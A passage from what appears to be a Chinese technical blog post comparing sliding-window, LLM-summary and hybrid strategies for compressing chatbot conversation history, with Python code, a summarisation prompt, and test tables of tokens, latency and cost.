<li>滑动窗口：<strong>机械删除</strong>，不管内容重要性</li>
<li>LLM摘要：<strong>智能提取</strong>，保留关键信息</li>
</ul>
<h4 data-id="heading-42"><strong>Prompt工程（关键！）</strong></h4>
<p>LLM摘要的效果高度依赖Prompt的质量。以下是我们使用的Prompt：</p>
<pre><code class="hljs language-python" lang="python">SUMMARY_PROMPT = <span class="hljs-string">"""请总结以下对话历史，提取关键信息：

对话内容：
{conversation}

请按以下格式输出摘要（150字以内）：

📝 对话历史摘要：
1. **用户基本信息**：姓名、年龄、地点、职业等
2. **用户偏好与兴趣**：提到的兴趣、偏好
3. **讨论主要话题**：聊了什么
4. **重要决定或结论**：做了什么决定
5. **关键细节**：其他重要信息

要求：
- 简洁明了，不超过150字
- 只保留关键信息，删除寒暄
- 使用结构化格式
"""</span>
</code></pre>
<p><strong>Prompt设计的关键点：</strong></p>
<ol>
<li>✅ 明确输出格式（结构化）</li>
<li>✅ 指定提取维度（姓名、地点、话题等）</li>
<li>✅ 限制长度（150字）</li>
<li>✅ 强调关键信息优先</li>
</ol>
<h4 data-id="heading-43"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>
<span class="hljs-keyword">from</span> src.llm.base <span class="hljs-keyword">import</span> BaseLLM


<span class="hljs-keyword">class</span> <span class="hljs-title class_">LLMSummaryCompressor</span>:
    <span class="hljs-string">"""
    LLM摘要压缩器
    
    特点：
    - 智能提取关键信息
    - 保留语义完整性
    - 适合长对话场景
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm: BaseLLM, keep_recent_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span></span>):
        <span class="hljs-string">"""
        Args:
            llm: LLM实例
            keep_recent_turns: 保留最近几轮完整对话
        """</span>
        self.llm = llm
        self.keep_recent_turns = keep_recent_turns
        self.keep_recent_messages = keep_recent_turns * <span class="hljs-number">2</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩消息列表
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 如果消息不够多，不压缩</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &lt;= self.keep_recent_messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 分割：历史部分 vs 最近部分</span>
        history = messages[:-self.keep_recent_messages]
        recent = messages[-self.keep_recent_messages:]
        
        <span class="hljs-comment"># 生成历史摘要</span>
        summary = self._summarize(history)
        
        <span class="hljs-comment"># 构建压缩结果：摘要 + 最近对话</span>
        compressed = [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: summary}
        ]
        compressed.extend(recent)
        
        <span class="hljs-keyword">return</span> compressed
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_summarize</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""
        用LLM生成对话摘要
        
        Args:
            messages: 需要摘要的消息列表
            
        Returns:
            摘要文本
        """</span>
        <span class="hljs-comment"># 格式化对话内容</span>
        conversation_text = <span class="hljs-string">"\n"</span>.join([
            <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'用户'</span> <span class="hljs-keyword">if</span> m[<span class="hljs-string">'role'</span>] == <span class="hljs-string">'user'</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'助手'</span>}</span>: <span class="hljs-subst">{m[<span class="hljs-string">'content'</span>]}</span>"</span>
            <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages
        ])
        
        <span class="hljs-comment"># 构建Prompt</span>
        prompt = <span class="hljs-string">f"""请总结以下对话历史，提取关键信息：

对话内容：
<span class="hljs-subst">{conversation_text}</span>

请按以下格式输出摘要（150字以内）：

📝 对话历史摘要：
1. **用户基本信息**：姓名、年龄、地点、职业等
2. **用户偏好与兴趣**：提到的兴趣、偏好
3. **讨论主要话题**：聊了什么
4. **重要决定或结论**：做了什么决定
5. **关键细节**：其他重要信息

要求：
- 简洁明了，不超过150字
- 只保留关键信息，删除寒暄
- 使用结构化格式
"""</span>
        
        <span class="hljs-comment"># 调用LLM生成摘要</span>
        summary = self.llm.chat([
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}
        ])
        
        <span class="hljs-keyword">return</span> summary
</code></pre>
<h4 data-id="heading-44"><strong>真实性能测试</strong></h4>
<p>我们对LLM摘要压缩器进行了完整测试，以下是真实数据：</p>
<hr/>
<p><strong>测试1：压缩率（保留最近3轮）</strong></p>








































<table><thead><tr><th>对话长度</th><th>原始</th><th>压缩后</th><th>Token压缩率</th><th>结果</th></tr></thead><tbody><tr><td>5轮（短对话）</td><td>10条 / 126 tokens</td><td>7条 / 303 tokens</td><td><strong>-140.5%</strong> ❌</td><td>Token反增</td></tr><tr><td>10轮（中等）</td><td>20条 / 249 tokens</td><td>7条 / 408 tokens</td><td><strong>-63.9%</strong> ❌</td><td>Token反增</td></tr><tr><td>20轮（长对话）</td><td>42条 / 560 tokens</td><td>7条 / 539 tokens</td><td><strong>3.7%</strong> ⚠️</td><td>微弱压缩</td></tr><tr><td>30轮（超长）</td><td>68条 / 933 tokens</td><td>7条 / 628 tokens</td><td><strong>32.7%</strong> ✅</td><td>有效压缩</td></tr></tbody></table>
<p><strong>意外发现：LLM摘要在短对话中完全是负优化！</strong></p>
<p>原因分析：</p>
<pre><code class="hljs language-markdown" lang="markdown">短对话（5轮，126 tokens）：
原文: "我叫Tom"、"你好Tom"、"我在上海"...

摘要（303 tokens）：
"📝 对话历史摘要：
<span class="hljs-bullet">1.</span> <span class="hljs-strong">**用户基本信息**</span>：
<span class="hljs-bullet">   -</span> 姓名：Tom
<span class="hljs-bullet">   -</span> 地点：上海
<span class="hljs-bullet">   -</span> 职业：未明确说明行业
<span class="hljs-bullet">2.</span> <span class="hljs-strong">**用户偏好和兴趣**</span>：未提及
<span class="hljs-bullet">3.</span> <span class="hljs-strong">**讨论主要话题**</span>：..."

问题：摘要本身比原文还啰嗦！
</code></pre>
<p><strong>结论：只有在超长对话（≥30轮）时，LLM摘要才开始产生正收益。</strong></p>
<hr/>
<p><strong>测试2：速度测试</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">测试对话：10轮（20条消息）

<span class="hljs-section">压缩1次:  8,939ms  (约9秒)</span>
<span class="hljs-section">压缩3次:  25,210ms (平均8.4秒/次)</span>
<span class="hljs-section">压缩5次:  42,599ms (平均8.5秒/次)</span>

平均速度：8.5秒/次 🐌
</code></pre>
<p><strong>对比：</strong></p>
<ul>
<li>滑动窗口：0.0001ms</li>
<li>LLM摘要：8,500ms</li>
<li><strong>差距：85,000,000倍！</strong></li>
</ul>
<p><strong>为什么这么慢？</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 网络请求：50-100ms
<span class="hljs-bullet">2.</span> LLM推理：8,000ms+
<span class="hljs-bullet">3.</span> 返回结果：50-100ms
总计：约8,500ms
</code></pre>
<p><strong>结论：LLM摘要会显著增加响应延迟。</strong></p>
<hr/>
<p><strong>测试3：成本分析</strong></p>
<p>DeepSeek价格：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.14</mn><mi mathvariant="normal">/</mi><mn>1</mn><mi>M</mi><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>s</mi><mtext>，</mtext></mrow><annotation encoding="application/x-tex">0.14/1M input tokens，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.14/1</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">in</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">，</span></span></span></span></span>0.28/1M output tokens</p>








































<table><thead><tr><th>对话长度</th><th>输入tokens</th><th>输出tokens</th><th>单次成本</th><th>1万次成本</th></tr></thead><tbody><tr><td>5轮</td><td>48</td><td>14</td><td>$0.000011</td><td>$0.11</td></tr><tr><td>10轮</td><td>175</td><td>52</td><td>$0.000039</td><td>$0.39</td></tr><tr><td>20轮</td><td>474</td><td>142</td><td>$0.000106</td><td><strong>$1.06</strong></td></tr><tr><td>30轮</td><td>852</td><td>256</td><td>$0.000191</td><td><strong>$1.91</strong></td></tr></tbody></table>
<p><strong>规模化成本估算：</strong></p>
<pre><code class="hljs language-bash" lang="bash">场景：日活10万用户的客服系统
- 每用户平均20轮对话
- 每次压缩成本：<span class="hljs-variable">$0</span>.0001

成本计算：
- 日成本：10万 × <span class="hljs-variable">$0</span>.0001 = <span class="hljs-variable">$10</span>
- 月成本：<span class="hljs-variable">$10</span> × 30 = <span class="hljs-variable">$300</span>
- 年成本：<span class="hljs-variable">$3</span>,600

vs 滑动窗口：<span class="hljs-variable">$0</span>
</code></pre>
<p><strong>结论：LLM摘要有明确的成本开销，需要权衡。</strong></p>
<hr/>
<p><strong>测试4：信息保留测试（关键！）</strong></p>
<p>构造一个包含9个关键信息的对话（6轮）：</p>
<pre><code class="hljs language-python" lang="python">关键信息：
Tom, <span class="hljs-number">28</span>岁, 上海, 浦东, AI工程师, Agent, 多智能体, 通信延迟, 消息队列

原始对话：<span class="hljs-number">12</span>条消息

压缩后：<span class="hljs-number">5</span>条消息
├─ <span class="hljs-number">1</span>条摘要
└─ <span class="hljs-number">4</span>条最近对话（保留<span class="hljs-number">2</span>轮）
</code></pre>
<p><strong>摘要内容（实际生成）：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">📝 对话历史摘要：
<span class="hljs-strong">**用户基本信息**</span>
<span class="hljs-bullet">-</span> 姓名：Tom
<span class="hljs-bullet">-</span> 年龄：28岁
<span class="hljs-bullet">-</span> 地点：上海浦东
<span class="hljs-bullet">-</span> 职业：AI工程师

<span class="hljs-strong">**用户偏好与兴趣**</span>
<span class="hljs-bullet">-</span> 对AI领域前沿技术感兴趣，目前专注于Agent多智能体协作研究。

<span class="hljs-strong">**讨论主要话题**</span>
<span class="hljs-bullet">1.</span> 用户自我介绍（姓名、年龄、职业、工作地点）
<span class="hljs-bullet">2.</span> 职业方向讨论（AI工程师的前景）
<span class="hljs-bullet">3.</span> 技术研究热点（多智能体协作）

<span class="hljs-strong">**关键细节**</span>
<span class="hljs-bullet">-</span> 年龄：28岁
<span class="hljs-bullet">-</span> 地点：上海浦东
<span class="hljs-bullet">-</span> 研究方向：Agent多智能体协作
</code></pre>
<p><strong>信息保留情况：</strong></p>
<pre><code class="hljs language-ini" lang="ini">✅ Tom          - 保留
✅ 28岁         - 保留
✅ 上海         - 保留
✅ 浦东         - 保留
✅ AI工程师     - 保留
✅ Agent        - 保留
✅ 多智能体     - 保留
✅ 通信延迟     - 保留（在最近对话中）
✅ 消息队列     - 保留（在最近对话中）

保留率：9/<span class="hljs-attr">9</span> = <span class="hljs-number">100</span>% ✅
</code></pre>
<p><strong>对比滑动窗口：</strong></p>
<ul>
<li>滑动窗口（5轮）：丢失Tom、28岁、上海、浦东、AI工程师</li>
<li>LLM摘要：全部保留</li>
</ul>
<p><strong>这就是LLM摘要的核心价值：智能提取，不丢失关键信息！</strong></p>
<hr/>
<p><strong>测试5：与滑动窗口直接对比</strong></p>
<p>测试对话：20轮（42条消息，560 tokens）</p>


























<table><thead><tr><th>策略</th><th>结果</th><th>Token数</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>滑动窗口</td><td>10条消息</td><td>145 tokens</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条消息</td><td>571 tokens</td><td>14,263ms</td><td>$0.000114</td></tr></tbody></table>
<p><strong>关键对比：</strong></p>
<pre><code class="hljs language-diff" lang="diff">Token效率：
<span class="hljs-deletion">- 滑动窗口：145 tokens（74%压缩）✅</span>
<span class="hljs-deletion">- LLM摘要：571 tokens（-2%压缩）❌</span>
→ LLM摘要反而用了更多token！

速度：
<span class="hljs-deletion">- 滑动窗口：0.00ms</span>
<span class="hljs-deletion">- LLM摘要：14,263ms</span>
→ 慢了4,600,000倍！

成本：
<span class="hljs-deletion">- 滑动窗口：$0</span>
<span class="hljs-deletion">- LLM摘要：$0.000114</span>
→ 每次都有成本

但信息保留：
<span class="hljs-deletion">- 滑动窗口：❌ 丢失所有早期信息</span>
<span class="hljs-deletion">- LLM摘要：✅ 保留100%关键信息</span>
</code></pre>
<p><strong>核心矛盾：LLM摘要在token数量上甚至不如滑动窗口！</strong></p>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_llm_summary.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_llm_summary.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<hr/>
<h4 data-id="heading-45"><strong>为什么Token反而增加？</strong></h4>
<p>让我们分析一个实际案例：</p>
<pre><code class="hljs language-python" lang="python">原始对话（<span class="hljs-number">5</span>轮，<span class="hljs-number">126</span> tokens）：
用户: <span class="hljs-string">"我叫Tom"</span>                    (<span class="hljs-number">3</span> tokens)
助手: <span class="hljs-string">"你好Tom！"</span>                   (<span class="hljs-number">4</span> tokens)
用户: <span class="hljs-string">"我在上海"</span>                    (<span class="hljs-number">4</span> tokens)
助手: <span class="hljs-string">"上海不错"</span>                    (<span class="hljs-number">3</span> tokens)
...

LLM生成的摘要（<span class="hljs-number">303</span> tokens）：
<span class="hljs-string">"📝 对话历史摘要：
1. **用户基本信息**：
   - 姓名：Tom
   - 地点：上海
   - 职业：未明确说明行业
2. **用户偏好和兴趣**：未提及
3. **讨论主要话题**：基本信息交流
4. **重要决定或结论**：无
5. **关键细节**：..."</span>
</code></pre>
<p><strong>问题在于：</strong></p>
<ol>
<li>摘要包含大量<strong>格式化文本</strong>（标题、序号、分隔符）</li>
<li>摘要有<strong>冗余描述</strong>（"未提及"、"无"这些也占token）</li>
<li>原始对话本来就<strong>很短很精炼</strong></li>
</ol>
<p><strong>解决方案：优化Prompt</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 优化前（当前使用的）</span>
<span class="hljs-string">"请按以下格式输出摘要（150字以内）：
📝 对话历史摘要：
1. **用户基本信息**：..."</span>

<span class="hljs-comment"># 优化后（更紧凑）</span>
<span class="hljs-string">"用一句话总结关键信息，格式：
Tom，28岁，上海AI工程师，研究Agent"</span>

压缩效果：
- 优化前：<span class="hljs-number">303</span> tokens
- 优化后：约<span class="hljs-number">30</span> tokens ✅
</code></pre>
<hr/>
<h4 data-id="heading-46"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 唯一的核心优势：信息保留</strong></p>
<pre><code class="hljs language-diff" lang="diff">测试结果：100%保留关键信息
<span class="hljs-deletion">- ✅ 用户姓名（Tom）</span>
<span class="hljs-deletion">- ✅ 年龄（28岁）</span>
<span class="hljs-deletion">- ✅ 地点（上海浦东）</span>
<span class="hljs-deletion">- ✅ 职业（AI工程师）</span>
<span class="hljs-deletion">- ✅ 兴趣（Agent多智能体）</span>

vs 滑动窗口：全部丢失 ❌
</code></pre>
<p><strong>这是LLM摘要的立身之本！</strong></p>
<p><strong>❌ 三大致命缺陷：</strong></p>
<ol>
<li><strong>短对话负优化</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 5轮对话：Token -140%（反而增加）</span>
<span class="hljs-deletion">- 10轮对话：Token -64%</span>
<span class="hljs-deletion">- 只有30轮以上才开始正收益</span>

结论：不适合短对话 ❌
</code></pre>
<ol>
<li><strong>速度极慢</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测：8.5秒/次
对比：滑动窗口0.0001ms

影响：
<span class="hljs-deletion">- 用户等待时间增加8秒</span>
<span class="hljs-deletion">- 实时对话体验差</span>
<span class="hljs-deletion">- 高并发场景瓶颈</span>

结论：不适合实时场景 ❌
</code></pre>
<ol>
<li><strong>有明确成本</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">实测：<span class="hljs-variable">$0</span>.0001-0.0002/次

规模化：
- 日活10万：<span class="hljs-variable">$10</span>/天
- 年成本：<span class="hljs-variable">$3</span>,600

vs 滑动窗口：<span class="hljs-variable">$0</span>

结论：有成本压力 ⚠️
</code></pre>
<hr/>
<h4 data-id="heading-47"><strong>适用场景指南</strong></h4>
<p>基于真实测试，LLM摘要的适用场景非常<strong>有限且明确</strong>：</p>
<p><strong>✅ 唯一推荐场景：超长对话 + 需要保留用户信息</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">同时满足以下条件：
<span class="hljs-bullet">1.</span> ✅ 对话≥30轮（否则token负优化）
<span class="hljs-bullet">2.</span> ✅ 包含重要用户信息（姓名、偏好等）
<span class="hljs-bullet">3.</span> ✅ 可以容忍8秒延迟
<span class="hljs-bullet">4.</span> ✅ 有预算支持LLM调用

典型场景：
<span class="hljs-bullet">-</span> 心理咨询（长时间深度对话）
<span class="hljs-bullet">-</span> 教育辅导（需要记住学生背景）
<span class="hljs-bullet">-</span> 高端客服（VIP用户，体验优先）
<span class="hljs-bullet">-</span> 项目顾问（持续数周的项目讨论）
</code></pre>
<p><strong>❌ 不推荐场景：</strong></p>
<ol>
<li><strong>短对话（&lt;30轮）</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">问题：Token反而增加，完全负优化
数据：<span class="hljs-number">10</span>轮对话token -<span class="hljs-number">64</span><span class="hljs-comment">%</span>
替代：用滑动窗口
</code></pre>
<ol>
<li><strong>实时对话</strong></li>
</ol>

<pre><code class="hljs">问题：8秒延迟无法接受
数据：比滑动窗口慢460万倍
替代：用滑动窗口
</code></pre>
<ol>
<li><strong>大规模免费产品</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">问题：成本累积快
数据：日活10万年成本<span class="hljs-variable">$3</span>,600
替代：用滑动窗口或混合策略
</code></pre>
<ol>
<li><strong>简单问答</strong></li>
</ol>

<pre><code class="hljs">问题：不需要记住用户信息
数据：摘要开销大于收益
替代：用滑动窗口
</code></pre>
<hr/>
<h4 data-id="heading-48"><strong>优化建议</strong></h4>
<p>如果一定要用LLM摘要，可以这样优化：</p>
<p><strong>1. 简化Prompt，减少格式化文本</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 当前Prompt（303 tokens输出）</span>
<span class="hljs-string">"请按以下格式输出摘要（150字以内）：
📝 对话历史摘要：
1. **用户基本信息**：..."</span>

<span class="hljs-comment"># 优化Prompt（约50 tokens）</span>
<span class="hljs-string">"一句话总结：Tom，28岁，上海AI工程师，研究Agent多智能体协作，遇到通信延迟问题。"</span>

效果：token减少<span class="hljs-number">80</span>% ✅
</code></pre>
<p><strong>2. 提高触发阈值</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 不好：10轮就触发</span>
compressor = LLMSummaryCompressor(llm, keep_recent_turns=<span class="hljs-number">3</span>)
<span class="hljs-comment"># 10轮时token还是负数</span>

<span class="hljs-comment"># 更好：30轮才触发</span>
<span class="hljs-comment"># 只在真正需要时才用LLM摘要</span>
</code></pre>
<p><strong>3. 异步压缩</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 同步（阻塞用户）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">user_input</span>):
    compressed = compressor.compress(history)  <span class="hljs-comment"># 等待8秒</span>
    response = llm.chat(compressed)
    <span class="hljs-keyword">return</span> response

<span class="hljs-comment"># 异步（不阻塞）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">user_input</span>):
    <span class="hljs-comment"># 后台异步压缩</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(history) &gt; <span class="hljs-number">30</span>:
        asyncio.create_task(compress_in_background())
    
    <span class="hljs-comment"># 直接用未压缩的历史回复</span>
    response = llm.chat(history)
    <span class="hljs-keyword">return</span> response
</code></pre>
<p><strong>4. 缓存摘要结果</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LLMSummaryCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.summary_cache = {}  <span class="hljs-comment"># 缓存已生成的摘要</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 检查是否有缓存</span>
        cache_key = <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">tuple</span>(m[<span class="hljs-string">'content'</span>] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages[:-<span class="hljs-number">6</span>]))
        <span class="hljs-keyword">if</span> cache_key <span class="hljs-keyword">in</span> self.summary_cache:
            <span class="hljs-keyword">return</span> self.summary_cache[cache_key]  <span class="hljs-comment"># 直接返回</span>
        
        <span class="hljs-comment"># 生成新摘要</span>
        summary = self._summarize(messages[:-<span class="hljs-number">6</span>])
        self.summary_cache[cache_key] = summary
        <span class="hljs-keyword">return</span> summary
</code></pre>
<hr/>
<h4 data-id="heading-49"><strong>小结</strong></h4>
<p>LLM摘要压缩器的真实表现：</p>
<pre><code class="hljs language-diff" lang="diff">核心优势：
✅ 100%信息保留（唯一亮点）
✅ 智能理解对话内容
✅ 提取关键信息

核心劣势：
❌ 短对话负优化（token反增）
❌ 速度极慢（8.5秒）
❌ 有明确成本（$0.0001/次）

定位：
仅适合超长对话（≥30轮）+ 需要保留用户信息的场景

对比滑动窗口：
<span class="hljs-deletion">- Token效率：❌ 更差</span>
<span class="hljs-deletion">- 速度：❌ 慢460万倍</span>
<span class="hljs-deletion">- 成本：❌ 有成本</span>
<span class="hljs-deletion">- 信息保留：✅ 完胜（100% vs 0%）</span>
</code></pre>
<p><strong>结论：LLM摘要不是通用方案，只在特定场景下才值得使用。</strong></p>
<p>在下一节，我们将看到<strong>混合策略</strong> - 结合两者优势，自动选择最优方案。</p>
<hr/>
<p>这将是最实用的策略 - 自动在滑动窗口和LLM摘要之间选择！😊</p>
<p>好的！根据真实测试数据，让我写一个完整的混合策略部分 📝</p>
<hr/>
<h3 data-id="heading-50"><strong>3.4 策略3：混合策略（Hybrid）</strong></h3>
<h4 data-id="heading-51"><strong>核心原理</strong></h4>
<p>混合策略是一种<strong>自适应压缩</strong>方案：根据对话长度自动选择最优策略。</p>
<pre><code class="hljs language-markdown" lang="markdown">决策流程：
┌─────────────────┐
│  计算对话轮数   │
└────────┬────────┘
<span class="hljs-code">         │
    ┌────▼────────┐
    │轮数≤阈值(10)?│
    └────┬────────┘
         │
    ┌────▼─────────────────────┐
    │ 是              │ 否      │
┌───▼──────┐      ┌──▼─────────┐
│滑动窗口   │      │  LLM摘要   │
│- 速度快   │      │  - 保留信息│
│- 零成本   │      │  - 速度慢  │
│- 简单直接 │      │  - 有成本  │
└──────────┘      └────────────┘
</span></code></pre>
<p><strong>设计思想：</strong></p>
<p>在短对话和长对话中，用户的核心需求不同：</p>
<pre><code class="hljs language-diff" lang="diff">短对话（≤10轮）：
<span class="hljs-deletion">- 用户需求：快速响应</span>
<span class="hljs-deletion">- 痛点：等待时间</span>
<span class="hljs-deletion">- 信息丢失风险：低（对话刚开始）</span>
<span class="hljs-deletion">- 最优策略：滑动窗口</span>

长对话（&gt;10轮）：
<span class="hljs-deletion">- 用户需求：记住之前说的话</span>
<span class="hljs-deletion">- 痛点：重复解释</span>
<span class="hljs-deletion">- 信息丢失风险：高（早期信息已被删除）</span>
<span class="hljs-deletion">- 最优策略：LLM摘要</span>
</code></pre>
<p><strong>核心假设：</strong> 在长对话中，用户体验的提升 &gt; Token成本和速度损失</p>
<h4 data-id="heading-52"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>
<span class="hljs-keyword">from</span> src.llm.base <span class="hljs-keyword">import</span> BaseLLM
<span class="hljs-keyword">from</span> src.memory.compressor <span class="hljs-keyword">import</span> SlidingWindowCompressor, LLMSummaryCompressor


<span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridCompressor</span>:
    <span class="hljs-string">"""
    混合策略压缩器
    
    特点：
    - 自动选择最优策略
    - 短对话快速，长对话智能
    - 平衡效率与体验
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 llm: BaseLLM,
                 threshold_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span>,
                 keep_recent_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>):
        <span class="hljs-string">"""
        Args:
            llm: LLM实例
            threshold_turns: 切换阈值（轮数）
            keep_recent_turns: 保留最近几轮
        """</span>
        self.llm = llm
        self.threshold_turns = threshold_turns
        
        <span class="hljs-comment"># 初始化两种策略</span>
        self.sliding_window = SlidingWindowCompressor(
            keep_turns=keep_recent_turns
        )
        self.llm_summary = LLMSummaryCompressor(
            llm=llm,
            keep_recent_turns=keep_recent_turns
        )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        根据对话长度自动选择策略
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 计算当前轮数</span>
        turn_count = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        
        <span class="hljs-comment"># 决策：选择哪个策略</span>
        <span class="hljs-keyword">if</span> turn_count &lt;= self.threshold_turns:
            <span class="hljs-comment"># 短对话：使用滑动窗口（快速、低成本）</span>
            <span class="hljs-keyword">return</span> self.sliding_window.compress(messages)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># 长对话：使用LLM摘要（智能、保留信息）</span>
            <span class="hljs-keyword">return</span> self.llm_summary.compress(messages)
</code></pre>
<p><strong>核心逻辑就一行：</strong> 根据轮数判断用哪个策略。</p>
<h4 data-id="heading-53"><strong>真实性能测试</strong></h4>
<p>我们对混合策略进行了完整测试，统一了所有参数（<code>keep_turns=5</code>），以下是真实数据：</p>
<hr/>
<p><strong>测试1：策略自动选择（验证正确性）</strong></p>
<p>配置：阈值=10轮，保留5轮</p>













































<table><thead><tr><th>对话长度</th><th>轮数</th><th>预期策略</th><th>实际策略</th><th>压缩结果</th><th>耗时</th></tr></thead><tbody><tr><td>短对话</td><td>5轮</td><td>滑动窗口</td><td>滑动窗口 ✅</td><td>10条→10条</td><td>0.00ms</td></tr><tr><td>中等对话</td><td>10轮</td><td>滑动窗口</td><td>滑动窗口 ✅</td><td>20条→10条</td><td>0.00ms</td></tr><tr><td>长对话</td><td>21轮</td><td>LLM摘要</td><td>LLM摘要 ✅</td><td>42条→11条</td><td>11,832ms</td></tr><tr><td>超长对话</td><td>34轮</td><td>LLM摘要</td><td>LLM摘要 ✅</td><td>68条→11条</td><td>14,534ms</td></tr></tbody></table>
<p><strong>结论：策略切换逻辑100%准确。</strong></p>
<hr/>
<p><strong>测试2：三种策略性能对比（关键测试！）</strong></p>
<p>统一参数配置：</p>
<ul>
<li>滑动窗口：保留5轮</li>
<li>混合策略：保留5轮（短对话时）</li>
<li>LLM摘要：保留3轮 + 摘要</li>
</ul>
<hr/>
<p><strong>场景1：短对话（5轮，126 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>滑动窗口</td><td>10条</td><td>126</td><td>0%</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>303</td><td>-141% ❌</td><td>7,471ms</td><td>$0.0001</td></tr><tr><td><strong>混合策略</strong></td><td><strong>10条</strong></td><td><strong>126</strong></td><td><strong>0%</strong></td><td>0.01ms</td><td>$0</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs">✅ 滑动窗口 vs 混合策略：完全一致
   10条消息, 126 tokens
</code></pre>
<p><strong>关键发现：参数统一后，短对话时混合策略与滑动窗口完全相同！</strong></p>
<hr/>
